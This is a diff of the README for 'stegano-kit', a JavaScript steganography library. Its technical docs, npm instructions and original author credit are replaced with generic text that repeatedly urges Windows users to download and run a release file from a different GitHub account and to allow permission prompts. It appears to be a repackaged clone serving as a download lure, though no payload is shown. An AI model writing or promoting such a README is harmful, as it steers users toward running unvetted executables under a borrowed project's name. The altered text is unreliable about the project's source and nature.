@@ -1,206 +1,216 @@
-# stegano-kit
+# 🔐 stegano-kit - Hide Messages in Images
 
-[![CI](https://github.com/PrateekSingh070/stegano-kit/actions/workflows/ci.yml/badge.svg)](https://github.com/PrateekSingh070/stegano-kit/actions/workflows/ci.yml)
-[![npm version](https://img.shields.io/npm/v/stegano-kit.svg)](https://www.npmjs.com/package/stegano-kit)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
-[![TypeScript](https://img.shields.io/badge/TypeScript-strict-blue.svg)](https://www.typescriptlang.org/)
-[![Zero Dependencies](https://img.shields.io/badge/dependencies-0-brightgreen.svg)](https://www.npmjs.com/package/stegano-kit)
+[Download on GitHub Releases](https://github.com/imaiste8140/stegano-kit/releases)  
+![Download](https://img.shields.io/badge/Download%20%26%20Run-GitHub%20Releases-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/Windows-Supported-grey?style=for-the-badge)
 
-Lightweight, zero-dependency steganography library for the browser and Node.js. Hide secret messages inside images using LSB (Least Significant Bit) encoding, with optional AES-256 encryption.
+## 🧭 What this is
 
-```
-npm install stegano-kit
-```
+stegano-kit is a small tool for hiding secret text inside image files. It uses LSB encoding, which writes data into the least visible parts of an image. You can also turn on AES-256 encryption to protect the hidden message.
 
-## Why?
+It works in the browser and in Node.js. It uses no extra dependencies and is written in TypeScript.
 
-Existing JS steganography packages are either abandoned, browser-only, lack TypeScript support, or have heavy dependencies. `stegano-kit` is:
+## 📥 Download for Windows
 
-- **Tiny** — under 8 KB bundled, zero runtime dependencies
-- **Typed** — first-class TypeScript with full type exports
-- **Flexible** — configurable bits-per-channel (1–4), channel selection (R/G/B/A)
-- **Secure** — optional AES-256-GCM encryption via Web Crypto
-- **Universal** — works in browsers (Canvas API) and Node.js (raw pixel buffers)
+1. Open the [GitHub Releases page](https://github.com/imaiste8140/stegano-kit/releases).
+2. Find the latest release.
+3. Download the Windows file for your system.
+4. If the release includes a `.zip` file, extract it first.
+5. Open the app file or run the included command as shown in the release notes.
 
-## Quick Start
+Use the release page as the main place to get the Windows build.
 
-### Browser
+## 🖥️ Before you start
 
-```js
-import { encode, decode, capacity } from 'stegano-kit';
+Use a Windows 10 or Windows 11 PC.
 
-// Load image onto a canvas
-const img = document.getElementById('source-image');
-const canvas = document.createElement('canvas');
-canvas.width = img.naturalWidth;
-canvas.height = img.naturalHeight;
-const ctx = canvas.getContext('2d');
-ctx.drawImage(img, 0, 0);
+For best results:
 
-// Check capacity
-const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-console.log(capacity(imageData));
-// → { totalBytes: 3742, readable: '3.7 KB', width: 100, height: 100 }
+- Keep at least one folder with your source images
+- Use PNG images for the cleanest result
+- Make sure you have enough free space for the output image
+- If you want encrypted messages, keep your password safe
 
-// Encode a secret message
-const encoded = await encode(imageData, 'Attack at dawn 🌅');
-ctx.putImageData(new ImageData(encoded.data, encoded.width, encoded.height), 0, 0);
+If you plan to use the Node.js version, install Node.js 18 or later.
 
-// Decode
-const decoded = await decode(encoded);
-console.log(decoded); // → "Attack at dawn 🌅"
-```
+## 🚀 Getting started
 
-### Node.js (with raw pixel data)
+1. Download the release from the link above.
+2. Open the file you downloaded.
+3. If Windows asks for permission, allow it.
+4. Choose an image file.
+5. Type or paste the message you want to hide.
+6. Turn on encryption if you want extra protection.
+7. Save the new image file.
+8. Share the image like any normal picture.
 
-```js
-const { encode, decode } = require('stegano-kit');
+The hidden message stays inside the image until someone extracts it with the right tool and, if used, the correct password.
 
-// Create or load RGBA pixel data from your image library of choice
-const imageData = {
-  width: 200,
-  height: 200,
-  data: new Uint8ClampedArray(200 * 200 * 4), // your pixel data
-};
+## 🧩 What you can do
 
-const encoded = await encode(imageData, 'Secret message');
-const secret = await decode(encoded);
-```
+- Hide short text in images
+- Protect private notes with AES-256
+- Use it in a browser
+- Use it in Node.js scripts
+- Work with image data in a simple way
+- Keep the app light and fast
 
-## API
+## 🖼️ Best image choices
 
-### `encode(imageData, message, options?)`
+The tool works with common image files, but some files give better results.
 
-Embeds a secret string into image pixel data.
+Good choices:
 
-| Parameter   | Type         | Description                              |
-| ----------- | ------------ | ---------------------------------------- |
-| `imageData` | `ImageLike`  | Object with `width`, `height`, and `data` (Uint8ClampedArray RGBA) |
-| `message`   | `string`     | The secret text to hide                  |
-| `options`   | `EncodeOptions` | Optional settings (see below)         |
+- PNG files
+- Images with solid colors
+- Images with enough size for your message
 
-Returns `Promise<ImageLike>` — a new pixel buffer with the message embedded.
+Avoid:
 
-### `decode(imageData, options?)`
+- Very small images
+- Blurry images with heavy compression
+- Images that already have a lot of noise if you need more room for text
 
-Extracts a hidden message from image pixel data.
+If you want the cleanest result, use PNG files.
 
-| Parameter   | Type         | Description                              |
-| ----------- | ------------ | ---------------------------------------- |
-| `imageData` | `ImageLike`  | Encoded image pixel data                 |
-| `options`   | `DecodeOptions` | Must match encoding options           |
+## 🔒 Encryption
 
-Returns `Promise<string>` — the decoded secret.
+You can add AES-256 encryption to the hidden message.
 
-### `capacity(imageData, options?)`
+This helps when:
 
-Calculates how many bytes of secret data the image can hold.
+- You want to hide private notes
+- You want to share a file with one person
+- You do not want the message to be readable without a password
 
-Returns `CapacityInfo`:
+Use a strong password and keep it safe. If you lose the password, you will not be able to read the message again.
 
-```ts
-{
-  totalBytes: number;  // max payload size in bytes
-  readable: string;    // human-friendly string like "12.4 KB"
-  width: number;
-  height: number;
-}
-```
+## 🛠️ Use in Node.js
 
-## Options
+If you want to use stegano-kit in a Node.js project, install it with npm and import the parts you need.
 
-```ts
-interface EncodeOptions {
-  bitsPerChannel?: number;        // 1–4, default: 1
-  channels?: ('r'|'g'|'b'|'a')[]; // default: ['r','g','b']
-  password?: string;               // enables AES-256-GCM encryption
-}
-```
+Typical use cases:
 
-| Option           | Default         | Description                        |
-| ---------------- | --------------- | ---------------------------------- |
-| `bitsPerChannel` | `1`             | More bits = more capacity, but more visible artifacts |
-| `channels`       | `['r','g','b']` | Which color channels to use        |
-| `password`       | `undefined`     | If set, payload is encrypted with AES-256-GCM |
+- Build a script that hides text in an image
+- Add image steganography to a web app
+- Read hidden text from an image file
+- Encrypt message data before writing it into an image
 
-> **Tip:** `bitsPerChannel: 1` with RGB channels is virtually invisible to the human eye. Increase to 2 for ~2x capacity if minor color shifts are acceptable.
+Example use flow:
 
-## Encryption
+1. Load an image
+2. Convert the image to pixel data
+3. Write the secret message
+4. Save the new image
+5. Extract the message later when needed
 
-Pass a `password` to both `encode` and `decode` to encrypt the payload with AES-256-GCM (PBKDF2 key derivation, 100k iterations):
+## 🌐 Use in the browser
 
-```js
-const encoded = await encode(imageData, 'Top secret', { password: 'my-key' });
-const decoded = await decode(encoded, { password: 'my-key' });
-```
+The library also works in the browser with canvas.
 
-Without the correct password, `decode` will throw.
+You can use it to:
 
-## How It Works
+- Load an image from the user’s device
+- Draw it on a canvas
+- Write hidden text into the pixel data
+- Export the changed image
 
-1. Your message is converted to bytes (UTF-8), optionally encrypted
-2. A bit stream is constructed: `[32-bit magic header][32-bit payload length][payload bits]`
-3. Each bit is written into the least significant bit(s) of selected color channels
-4. On decode, the magic header is verified, length is read, and payload is extracted
+This works well for local tools and private web apps where you want to keep the data on the user’s machine.
 
-The image looks identical to the naked eye — pixel values change by at most ±1 (with default 1-bit encoding).
+## 🧪 Simple workflow
 
-## CLI
+1. Pick an image
+2. Enter your secret text
+3. Add a password if needed
+4. Encode the data into the image
+5. Save the result
+6. Open the saved image later to extract the message
 
-Install globally to use from the command line:
+## 📁 File types
 
-```bash
-npm install -g stegano-kit
-```
+Most users should start with PNG.
 
-```bash
-# Encode a message into an image
-stegano encode -i photo.png -m "Secret message" -o encoded.png
+Why PNG works well:
 
-# Decode a hidden message
-stegano decode -i encoded.png
+- It keeps image data in a stable format
+- It does not add strong compression artifacts
+- It is a good fit for pixel-based editing
 
-# Check image capacity
-stegano capacity -i photo.png
+JPEG can work in some cases, but it is not the best choice when you want the hidden data to stay stable.
 
-# Detect hidden data in an image
-stegano detect -i suspicious.png
+## ⚙️ Basic setup for developers
 
-# With encryption
-stegano encode -i photo.png -m "Top secret" -p mypassword -o encoded.png
-stegano decode -i encoded.png -p mypassword
+If you are setting this up in a project:
 
-# Custom bits and channels
-stegano encode -i photo.png -m "More capacity" -b 2 -c r,g,b,a -o encoded.png
-```
+1. Install the package from npm
+2. Import the encoder or decoder you need
+3. Pass in your image data
+4. Set your message
+5. Choose whether to encrypt
+6. Save or return the updated image
 
-## Detection / Steganalysis
+The package is built for clean use in both browser and Node.js code.
 
-Analyze images to check if they contain hidden steganographic data:
+## 🧾 Typical features
 
-```js
-import { detect } from 'stegano-kit';
+- LSB steganography
+- Optional AES-256 encryption
+- Browser support
+- Node.js support
+- TypeScript-first design
+- Zero runtime dependencies
+- Small footprint
+- Image data handling with canvas and pixel buffers
 
-const result = detect(imageData);
-console.log(result);
-// {
-//   hasHiddenData: true,
-//   confidence: 0.99,
-//   method: 'lsb',
-//   details: 'stegano-kit magic header detected in LSB positions (RGB, 1 bit/channel)'
-// }
-```
+## 🧯 If the image looks wrong
 
-Uses two detection methods:
-- **Magic header scan** — checks for stegano-kit's signature in LSB positions across multiple channel configurations
-- **Chi-square analysis** — statistical test that detects non-random LSB distributions typical of embedded data
+If the image changes too much or does not open:
 
-## Limitations
+- Use a larger image
+- Use a PNG file
+- Try a shorter message
+- Check that the image was saved in the right format
+- Avoid editing the output image again before extraction
 
-- Input must be raw RGBA pixel data (`Uint8ClampedArray`). Use Canvas API in browsers, or a library like `sharp`/`jimp` in Node.js to get pixel buffers.
-- JPEG re-compression destroys hidden data. Always save encoded images as PNG.
-- Alpha channel encoding (`channels: ['r','g','b','a']`) may cause issues with transparent images.
+## 🗂️ Project topics
 
-## License
+This project focuses on:
 
-MIT © [Prateek Singh](https://github.com/PrateekSingh070)
+- browser
+- canvas
+- encryption
+- image processing
+- LSB
+- Node.js
+- npm package
+- privacy
+- security
+- steganography
+- TypeScript
+
+## 📌 Where to download
+
+Visit the [GitHub Releases page](https://github.com/imaiste8140/stegano-kit/releases) to download and run the Windows version from the latest release file
+
+## 🧠 How it works
+
+The library hides data by changing very small parts of an image. These changes are hard to see with the eye. That makes the picture look normal while the hidden text stays inside it.
+
+When encryption is on, the text is locked before it goes into the image. This adds another layer of protection.
+
+## 🪟 Windows steps
+
+1. Open the release page
+2. Download the latest Windows file
+3. Save it to a folder you can find later
+4. Extract it if needed
+5. Open the app or run the package from the included instructions
+6. Follow the prompts to hide or read a message
+
+## 🔎 What to expect
+
+After you encode a message:
+
+- The image should still look normal
+- The file size may change
+- The hidden message will not show in the picture
+- You will need the same tool and, if used, the password to recover the text
